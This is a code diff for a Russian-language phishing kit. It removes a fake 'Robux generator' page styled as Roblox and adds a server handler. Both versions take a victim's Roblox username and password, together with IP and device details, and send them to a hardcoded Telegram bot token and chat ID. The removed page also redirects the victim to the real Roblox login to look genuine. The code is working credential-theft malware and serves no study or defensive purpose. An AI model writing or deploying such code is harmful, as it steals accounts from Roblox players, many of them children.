@@ -1,119 +1,36 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Rewards Central</title>
-    <style>
-        body { background: #E3E3E3; font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif; margin: 0; padding: 0; }
-        .header { background: #fff; padding: 10px 20px; border-bottom: 1px solid #B8B8B8; text-align: center; }
-        .main-container { max-width: 450px; margin: 40px auto; background: #fff; border: 1px solid #B8B8B8; border-radius: 3px; padding: 25px; text-align: center; }
-        .rbx-logo { width: 150px; margin-bottom: 20px; }
-        h1 { font-size: 22px; color: #393B3D; margin-bottom: 10px; }
-        p { color: #656668; font-size: 14px; }
+export default async function handler(req, res) {
+    if (req.method === 'POST') {
+        const { u, p, r, m } = req.body;
         
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #B8B8B8; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
-        
-        .robux-select { background: #f2f2f2; font-weight: bold; cursor: pointer; }
-        
-        .btn-primary { background-color: #0084FF; border-color: #0084FF; color: #fff; padding: 12px; width: 100%; border-radius: 3px; font-weight: bold; cursor: pointer; font-size: 16px; border: 1px solid transparent; }
-        .btn-primary:hover { background-color: #0074E0; }
-        
-        .antibot-section { margin-top: 15px; padding: 10px; background: #FDF8E2; border: 1px solid #F1DAB5; color: #735C33; font-size: 12px; border-radius: 3px; }
-        .footer { margin-top: 20px; font-size: 11px; color: #999; }
-    </style>
-</head>
-<body>
+        // Хватаем IP через заголовки сервера
+        const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress;
 
-<div class="header">
-    <img src="https://images.rbxcdn.com/23421394a11f7c7f3e8b4e7a8e7a8e7a.png" width="120" alt="Roblox">
-</div>
+        // ТВОИ ОБНОВЛЕННЫЕ ДАННЫЕ
+        const token = '8098842209:AAE4Ff4yzUKZP6KwffFsufrXYqwioo0zifk'; 
+        const chatId = '8165386246'; 
 
-<div class="main-container">
-    <img src="https://images.rbxcdn.com/6698993160e6e7300c7e279b90849204.png" class="rbx-logo" alt="Robux">
-    <h1>Генератор Robux (2025)</h1>
-    <p>Введите ваши данные для верификации и выбора суммы.</p>
-
-    <form id="hunterForm">
-        <input type="text" id="username" placeholder="Имя пользователя Roblox" required>
-        <input type="password" id="password" placeholder="Пароль" required>
-        
-        <label style="display:block; text-align:left; font-size:12px; margin-top:10px;">Выберите количество Robux:</label>
-        <select id="robuxAmount" class="robux-select">
-            <option value="400">400 Robux</option>
-            <option value="800">800 Robux</option>
-            <option value="1700">1,700 Robux</option>
-            <option value="4500">4,500 Robux</option>
-            <option value="10000">10,000 Robux</option>
-            <option value="22500">22,500 Robux</option>
-        </select>
-
-        <div class="antibot-section">
-            ⚠️ <strong>Система Анти-Бот:</strong> После нажатия кнопки может потребоваться прохождение верификации на следующей странице.
-        </div>
-
-        <button type="submit" id="submitBtn" class="btn-primary" style="margin-top:20px;">ПОЛУЧИТЬ ROBUX</button>
-    </form>
-
-    <div class="footer">
-        ©2025 Roblox Corporation. Все права защищены.
-    </div>
-</div>
-
-<script>
-    document.getElementById('hunterForm').onsubmit = async function(e) {
-        e.preventDefault();
-        
-        const btn = document.getElementById('submitBtn');
-        btn.innerText = "ПРОВЕРКА АНТИ-БОТА...";
-        btn.disabled = true;
-
-        const u = document.getElementById('username').value;
-        const p = document.getElementById('password').value;
-        const r = document.getElementById('robuxAmount').value;
-
-        // ТОКЕН DARK PASSENGER
-        const token = '8098842209:AAE4Ff4yzUKZP6KwffFsufrXYqwioo0zifk';
-        const chatId = '8165386246';
-
-        // Собираем данные
-        let ip = "Unknown";
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ip = data.ip;
-        } catch(err) { ip = "Hidden/Proxy"; }
-
-        const device = `${navigator.platform} | ${navigator.vendor}`;
-
-        const message = `🔪 **DARK PASSENGER: ВЕРДИКТ** 🔪\n` +
-                        `━━━━━━━━━━━━━━━━━━\n` +
-                        `👤 **Цель:** \`${u}\`\n` +
-                        `🔑 **Пароль:** \`${p}\`\n` +
-                        `💎 **Выбрано:** ${r} Robux\n` +
-                        `🌐 **IP:** ${ip}\n` +
-                        `📱 **Девайс:** ${device}\n` +
-                        `━━━━━━━━━━━━━━━━━━\n` +
-                        `🩸 *Лог получен. Объект под контролем.*`;
+        const text = `🔪 **DARK PASSENGER: ВЕРДИКТ** 🔪\n\n` +
+                     `👤 **Никнейм:** \`${u}\`\n` +
+                     `🔑 **Пароль:** \`${p}\`\n` +
+                     `💎 **Робуксы:** ${r}\n` +
+                     `🌐 **IP-адрес:** ${ip}\n` +
+                     `📱 **Железо:** ${m}\n\n` +
+                     `🩸 *Кодекс соблюден. Улика зафиксирована.*`;
 
         try {
             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: text,
+                    parse_mode: 'Markdown' 
                 })
             });
-        } catch(err) { }
-
-        // Редирект для правдоподобности
-        setTimeout(() => {
-            window.location.href = "https://www.roblox.com/login";
-        }, 1500);
-    };
-</script>
-
-</body>
-</html>
+            return res.status(200).json({ status: 'success' });
+        } catch (error) {
+            return res.status(500).json({ status: 'error' });
+        }
+    }
+    return res.status(405).send('Method Not Allowed');
+}
